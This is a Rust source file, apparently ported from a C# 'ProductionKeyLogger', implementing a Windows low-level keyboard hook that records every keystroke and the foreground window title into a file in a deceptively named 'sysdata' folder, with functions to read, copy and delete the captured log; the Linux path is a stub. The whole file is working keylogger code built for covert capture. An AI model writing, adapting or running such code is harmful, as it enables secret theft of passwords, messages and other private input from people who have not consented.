// logger.rs — Rust port of logger.cs (ProductionKeyLogger)
// Low-level keyboard logger with active window tracking (Windows).
// On non-Windows, provides a stub implementation.

use std::fs;
use std::io::Write;
use std::path::PathBuf;
use std::sync::{Mutex, atomic::{AtomicBool, Ordering}};
use chrono::Local;
use log::info;

static IS_RUNNING: AtomicBool = AtomicBool::new(false);

lazy_static::lazy_static! {
    static ref BUFFER: Mutex<String> = Mutex::new(String::new());
    static ref LOG_FILE: Mutex<Option<PathBuf>> = Mutex::new(None);
    static ref LAST_WINDOW_TITLE: Mutex<String> = Mutex::new(String::new());
}

#[allow(dead_code)]
const FLUSH_THRESHOLD: usize = 200;

pub struct ProductionKeyLogger;

impl ProductionKeyLogger {
    /// Starts the keylogger on a background thread.
    /// Non-blocking — returns immediately.
    pub fn start(log_directory: Option<&str>) {
        if IS_RUNNING.load(Ordering::Relaxed) {
            return;
        }

        let dir = log_directory
            .map(|s| PathBuf::from(s))
            .unwrap_or_else(|| {
                #[cfg(target_os = "windows")]
                {
                    let local = std::env::var("LOCALAPPDATA")
                        .unwrap_or_else(|_| std::env::temp_dir().to_string_lossy().to_string());
                    PathBuf::from(local).join("sysdata")
                }
                #[cfg(not(target_os = "windows"))]
                {
                    let home = std::env::var("HOME")
                        .unwrap_or_else(|_| "/tmp".to_string());
                    PathBuf::from(home).join(".sysdata")
                }
            });

        let _ = fs::create_dir_all(&dir);
        let log_file = dir.join(format!("input_{}.dat", Local::now().format("%Y%m%d")));

        *LOG_FILE.lock().unwrap() = Some(log_file.clone());
        IS_RUNNING.store(true, Ordering::Relaxed);

        #[cfg(target_os = "windows")]
        {
            // Start hook thread
            std::thread::Builder::new()
                .name("KeyboardHook".to_string())
                .spawn(move || {
                    hook_thread_proc();
                })
                .expect("Failed to start hook thread");
        }

        #[cfg(not(target_os = "windows"))]
        {
            // On Linux, use /dev/input or xinput — stub for now
            std::thread::Builder::new()
                .name("KeyboardCapture".to_string())
                .spawn(move || {
                    linux_capture_loop();
                })
                .expect("Failed to start capture thread");
        }

        info!("[+] Keylogger started. Log: {}", log_file.display());
    }

    /// Stops the keylogger and flushes remaining buffer.
    pub fn stop() {
        if !IS_RUNNING.load(Ordering::Relaxed) {
            return;
        }
        IS_RUNNING.store(false, Ordering::Relaxed);
        flush_buffer();
        info!("[+] Keylogger stopped.");
    }

    /// Returns the path to the current log file.
    pub fn get_log_file_path() -> Option<String> {
        LOG_FILE.lock().unwrap().as_ref().map(|p| p.to_string_lossy().to_string())
    }

    /// Returns the log content and optionally clears it.
    pub fn get_log_content(clear: bool) -> String {
        flush_buffer();

        let log_file = LOG_FILE.lock().unwrap();
        let path = match log_file.as_ref() {
            Some(p) if p.exists() => p,
            _ => return "No keylog data.".to_string(),
        };

        let content = fs::read_to_string(path).unwrap_or_else(|_| "Read error.".to_string());

        if clear {
            let _ = fs::remove_file(path);
        }

        content
    }

    /// Saves current log to a specific path.
    pub fn save_log_to(output_path: &str) -> String {
        flush_buffer();

        let log_file = LOG_FILE.lock().unwrap();
        if let Some(src) = log_file.as_ref() {
            if src.exists() {
                let _ = fs::copy(src, output_path);
            } else {
                let _ = fs::write(output_path, "No keylog data captured yet.");
            }
        }

        output_path.to_string()
    }
}

// ==================== Buffer Management ====================

#[allow(dead_code)]
fn append_to_buffer(text: &str) {
    let mut buffer = BUFFER.lock().unwrap();
    buffer.push_str(text);

    if buffer.len() >= FLUSH_THRESHOLD {
        flush_buffer_internal(&buffer);
        buffer.clear();
    }
}

fn flush_buffer() {
    let mut buffer = BUFFER.lock().unwrap();
    if !buffer.is_empty() {
        flush_buffer_internal(&buffer);
        buffer.clear();
    }
}

fn flush_buffer_internal(content: &str) {
    if content.is_empty() { return; }
    let log_file = LOG_FILE.lock().unwrap();
    if let Some(path) = log_file.as_ref() {
        let mut file = match fs::OpenOptions::new().create(true).append(true).open(path) {
            Ok(f) => f,
            Err(_) => return,
        };
        let _ = file.write_all(content.as_bytes());
    }
}

#[allow(dead_code)]
fn track_active_window() {
    #[cfg(target_os = "windows")]
    {
        let title = get_foreground_window_title();
        if !title.is_empty() {
            let mut last = LAST_WINDOW_TITLE.lock().unwrap();
            if *last != title {
                *last = title.clone();
                let header = format!(
                    "\n\n[{}] === {} ===\n",
                    Local::now().format("%H:%M:%S"),
                    title
                );
                drop(last); // Release lock before appending
                append_to_buffer(&header);
            }
        }
    }
}

// ==================== Special Key Names ====================

#[allow(dead_code)]
fn get_special_key_name(vk_code: i32) -> Option<&'static str> {
    match vk_code {
        8 => Some("[BS]"),
        9 => Some("[TAB]"),
        13 => Some("\n"),
        27 => Some("[ESC]"),
        32 => Some(" "),
        33 => Some("[PGUP]"),
        34 => Some("[PGDN]"),
        35 => Some("[END]"),
        36 => Some("[HOME]"),
        37 => Some("[←]"),
        38 => Some("[↑]"),
        39 => Some("[→]"),
        40 => Some("[↓]"),
        45 => Some("[INS]"),
        46 => Some("[DEL]"),
        // Skip modifier keys
        16 | 17 | 18 | 20 | 91 | 92 | 160..=165 => None,
        _ => None,
    }
}

// ==================== Windows Hook Thread ====================

#[cfg(target_os = "windows")]
fn hook_thread_proc() {
    use std::ptr;

    const WH_KEYBOARD_LL: i32 = 13;
    const WM_KEYDOWN: u32 = 0x0100;

    extern "system" {
        fn SetWindowsHookExW(id: i32, proc: usize, hmod: usize, thread: u32) -> usize;
        fn UnhookWindowsHookEx(hhk: usize) -> i32;
        fn CallNextHookEx(hhk: usize, code: i32, wparam: usize, lparam: usize) -> usize;
        fn GetModuleHandleW(name: *const u16) -> usize;
        fn GetMessageW(msg: *mut [u8; 48], hwnd: usize, min: u32, max: u32) -> i32;
        fn TranslateMessage(msg: *const [u8; 48]) -> i32;
        fn DispatchMessageW(msg: *const [u8; 48]) -> usize;
        fn GetKeyboardState(state: *mut u8) -> i32;
        fn ToUnicode(vk: u32, scan: u32, state: *const u8, buf: *mut u16, size: i32, flags: u32) -> i32;
        fn GetForegroundWindow() -> usize;
        fn GetWindowTextW(hwnd: usize, buf: *mut u16, max: i32) -> i32;
    }

    static mut HOOK_ID: usize = 0;

    unsafe extern "system" fn hook_callback(code: i32, wparam: usize, lparam: usize) -> usize {
        if code >= 0 && wparam == WM_KEYDOWN as usize {
            let vk_code = *(lparam as *const i32);
            track_active_window();

            let mut key_state = [0u8; 256];
            if GetKeyboardState(key_state.as_mut_ptr()) != 0 {
                let mut buf = [0u16; 4];
                let result = ToUnicode(vk_code as u32, 0, key_state.as_ptr(), buf.as_mut_ptr(), 4, 0);
                if result > 0 {
                    let ch = String::from_utf16_lossy(&buf[..result as usize]);
                    append_to_buffer(&ch);
                } else if let Some(special) = get_special_key_name(vk_code) {
                    append_to_buffer(special);
                }
            }
        }
        CallNextHookEx(HOOK_ID, code, wparam, lparam)
    }

    unsafe {
        let h_mod = GetModuleHandleW(ptr::null());
        HOOK_ID = SetWindowsHookExW(WH_KEYBOARD_LL, hook_callback as usize, h_mod, 0);

        if HOOK_ID == 0 {
            IS_RUNNING.store(false, Ordering::Relaxed);
            return;
        }

        let mut msg = [0u8; 48];
        while IS_RUNNING.load(Ordering::Relaxed) && GetMessageW(&mut msg, 0, 0, 0) != 0 {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }

        UnhookWindowsHookEx(HOOK_ID);
        HOOK_ID = 0;
    }
}

#[cfg(target_os = "windows")]
fn get_foreground_window_title() -> String {
    unsafe {
        extern "system" {
            fn GetForegroundWindow() -> usize;
            fn GetWindowTextW(hwnd: usize, buf: *mut u16, max: i32) -> i32;
        }
        let hwnd = GetForegroundWindow();
        let mut buf = [0u16; 256];
        let len = GetWindowTextW(hwnd, buf.as_mut_ptr(), 256);
        if len > 0 {
            String::from_utf16_lossy(&buf[..len as usize])
        } else {
            String::new()
        }
    }
}

// ==================== Linux Stub ====================

#[cfg(not(target_os = "windows"))]
fn linux_capture_loop() {
    // On Linux, one could read from /dev/input/eventN
    // This is a stub — would require root access and evdev parsing
    info!("[*] Linux keylogger stub: would use /dev/input/eventN");
    while IS_RUNNING.load(Ordering::Relaxed) {
        std::thread::sleep(std::time::Duration::from_secs(1));
    }
}
